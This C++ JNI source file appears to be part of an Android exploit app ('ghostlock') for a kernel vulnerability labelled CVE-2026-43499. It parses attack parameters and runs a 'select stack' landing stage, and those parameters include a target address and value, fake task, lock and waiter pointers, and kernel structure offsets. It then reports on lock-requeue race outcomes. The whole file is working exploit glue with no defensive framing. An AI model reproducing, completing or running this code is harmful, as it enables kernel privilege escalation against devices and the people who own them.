#include <jni.h>

#include <array>
#include <cerrno>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <unistd.h>

#include "backend/cve_2026_43499/landing/select_stack_route.hpp"
#include "backend/cve_2026_43499/landing/select_stack_route_linux.hpp"

namespace {
    constexpr std::uint32_t kMagic = 0x474C5352U;
    constexpr std::uint16_t kVersion = 1U;
    constexpr std::uint16_t kHeader = 192U;
    constexpr std::uint32_t kResultMagic = 0x474C5353U;
    constexpr std::uint32_t kResultBytes = 128U;
    constexpr std::uint32_t kMaxSelected = 64U;

    std::uint32_t u32(const std::uint8_t *p) noexcept {
        return static_cast<std::uint32_t>(p[0]) | (static_cast<std::uint32_t>(p[1]) << 8U) |
               (static_cast<std::uint32_t>(p[2]) << 16U) | (static_cast<std::uint32_t>(p[3]) << 24U);
    }
    std::uint64_t u64(const std::uint8_t *p) noexcept {
        return static_cast<std::uint64_t>(u32(p)) | (static_cast<std::uint64_t>(u32(p + 4U)) << 32U);
    }
    void put32(std::uint8_t *p, std::uint32_t v) noexcept {
        p[0] = static_cast<std::uint8_t>(v); p[1] = static_cast<std::uint8_t>(v >> 8U);
        p[2] = static_cast<std::uint8_t>(v >> 16U); p[3] = static_cast<std::uint8_t>(v >> 24U);
    }

    bool parse(const std::uint8_t *bytes, std::size_t size, ghostlock::backend::cve_2026_43499::landing::SelectStackConfig &out,
               std::array<std::int32_t, kMaxSelected> &selected, std::size_t &count,
               std::uint32_t &wait, std::uint32_t &chain, std::uint32_t &target) noexcept {
        if (bytes == nullptr || size < kHeader || u32(bytes) != kMagic ||
            static_cast<std::uint16_t>(u32(bytes + 4U) & 0xFFFFU) != kVersion) return false;
        out.target = u64(bytes + 32U); out.value = u64(bytes + 40U);
        out.fake_right = u64(bytes + 184U);
        out.fd_count = u32(bytes + 48U); out.attempts = static_cast<std::int32_t>(u32(bytes + 52U));
        out.select_wait_us = static_cast<std::int64_t>(u64(bytes + 56U));
        out.nice_modulus = static_cast<std::int32_t>(u32(bytes + 64U));
        out.waiter_shift = static_cast<std::int32_t>(u32(bytes + 68U));
        out.compact = u32(bytes + 72U) != 0U;
        out.fake_waiter_prio = u64(bytes + 80U); out.fake_task = u64(bytes + 88U); out.fake_lock = u64(bytes + 96U);
        out.word_task = static_cast<std::int32_t>(u32(bytes + 104U));
        out.word_lock = static_cast<std::int32_t>(u32(bytes + 108U));
        out.word_tree_pc = static_cast<std::int32_t>(u32(bytes + 112U));
        out.word_tree_right = static_cast<std::int32_t>(u32(bytes + 116U));
        out.word_tree_left = static_cast<std::int32_t>(u32(bytes + 120U));
        out.word_pi_pc = static_cast<std::int32_t>(u32(bytes + 124U));
        out.word_pi_right = static_cast<std::int32_t>(u32(bytes + 128U));
        out.word_pi_left = static_cast<std::int32_t>(u32(bytes + 132U));
        out.word_wake_prio = static_cast<std::int32_t>(u32(bytes + 136U));
        out.word_deadline = static_cast<std::int32_t>(u32(bytes + 140U));
        out.word_ww_ctx = static_cast<std::int32_t>(u32(bytes + 144U));
        wait = static_cast<std::uint32_t>(u64(bytes + 152U));
        chain = static_cast<std::uint32_t>(u64(bytes + 160U));
        target = static_cast<std::uint32_t>(u64(bytes + 168U));
        count = u32(bytes + 176U);
        if (count > kMaxSelected || kHeader + count * 4U > size) return false;
        for (std::size_t i = 0; i < count; ++i) selected[i] = static_cast<std::int32_t>(u32(bytes + kHeader + i * 4U));
        return out.fd_count != 0U && out.fd_count % 64U == 0U && out.attempts > 0;
    }
}  // namespace

extern "C" JNIEXPORT jbyteArray JNICALL
Java_com_ghostlock_app_jni_cve43499_NativeSelectStackJni_execute(
    JNIEnv *env, jclass, jbyteArray params, jintArray selected_fds) {
    if (params == nullptr || selected_fds == nullptr) return nullptr;
    const jsize length = env->GetArrayLength(params);
    if (length <= 0) return nullptr;
    jbyte *raw = env->GetByteArrayElements(params, nullptr);
    if (raw == nullptr) return nullptr;
    ghostlock::backend::cve_2026_43499::landing::SelectStackConfig config{};
    std::array<std::int32_t, kMaxSelected> selected{};
    std::size_t selected_count = 0U;
    std::uint32_t wait = 0U, chain = 0U, target = 0U;
    const bool parsed = parse(reinterpret_cast<const std::uint8_t *>(raw),
                              static_cast<std::size_t>(length), config, selected, selected_count, wait, chain, target);
    env->ReleaseByteArrayElements(params, raw, JNI_ABORT);
    if (!parsed) return nullptr;
    const jsize given = env->GetArrayLength(selected_fds);
    if (given < 0 || static_cast<std::size_t>(given) != selected_count) return nullptr;
    jint *fds = env->GetIntArrayElements(selected_fds, nullptr);
    if (fds == nullptr) return nullptr;
    for (jsize i = 0; i < given; ++i) selected[static_cast<std::size_t>(i)] = fds[i];
    env->ReleaseIntArrayElements(selected_fds, fds, JNI_ABORT);

    ghostlock::backend::cve_2026_43499::landing::SelectStackRoute<ghostlock::backend::cve_2026_43499::landing::SelectStackRouteLinux> route(config);
    (void)route.execute(&wait, &chain, &target, selected.data(), selected_count);
    route.cleanup();
    const ghostlock::backend::cve_2026_43499::landing::SelectStackReport &report = route.report();
    std::uint8_t out[kResultBytes] = {};
    put32(out, kResultMagic); put32(out + 4U, kVersion); put32(out + 8U, kResultBytes);
    put32(out + 16U, static_cast<std::uint32_t>(report.status_code));
    put32(out + 20U, static_cast<std::uint32_t>(report.status_step));
    put32(out + 24U, static_cast<std::uint32_t>(report.attempts));
    put32(out + 28U, static_cast<std::uint32_t>(report.calls));
    put32(out + 32U, static_cast<std::uint32_t>(report.successes));
    put32(out + 36U, static_cast<std::uint32_t>(report.waiter_lock));
    put32(out + 40U, static_cast<std::uint32_t>(report.waiter_park));
    put32(out + 44U, static_cast<std::uint32_t>(report.waiter_park_errno));
    put32(out + 48U, static_cast<std::uint32_t>(report.consumer_setattr));
    put32(out + 52U, static_cast<std::uint32_t>(report.consumer_setattr_errno));
    put32(out + 56U, static_cast<std::uint32_t>(report.requeue_result));
    put32(out + 60U, static_cast<std::uint32_t>(report.requeue_errno));
    put32(out + 64U, static_cast<std::uint32_t>(report.race_lock));
    put32(out + 68U, static_cast<std::uint32_t>(report.race_requeue));
    put32(out + 72U, static_cast<std::uint32_t>(report.race_outcome));
    put32(out + 76U, static_cast<std::uint32_t>(report.race_requeue_errno));
    put32(out + 80U, static_cast<std::uint32_t>(report.target_owner_word));
    put32(out + 84U, static_cast<std::uint32_t>(report.wait_word_value));
    put32(out + 88U, static_cast<std::uint32_t>(report.waiter_park_elapsed_us));
    put32(out + 92U, static_cast<std::uint32_t>(report.owner_requeue_result));
    put32(out + 96U, static_cast<std::uint32_t>(report.owner_requeue_errno));
    put32(out + 100U, static_cast<std::uint32_t>(report.select_result));
    put32(out + 104U, static_cast<std::uint32_t>(report.select_errno));
    jbyteArray answer = env->NewByteArray(static_cast<jsize>(kResultBytes));
    if (answer == nullptr) return nullptr;
    env->SetByteArrayRegion(answer, 0, static_cast<jsize>(kResultBytes),
                            reinterpret_cast<const jbyte *>(out));
    return answer;
}
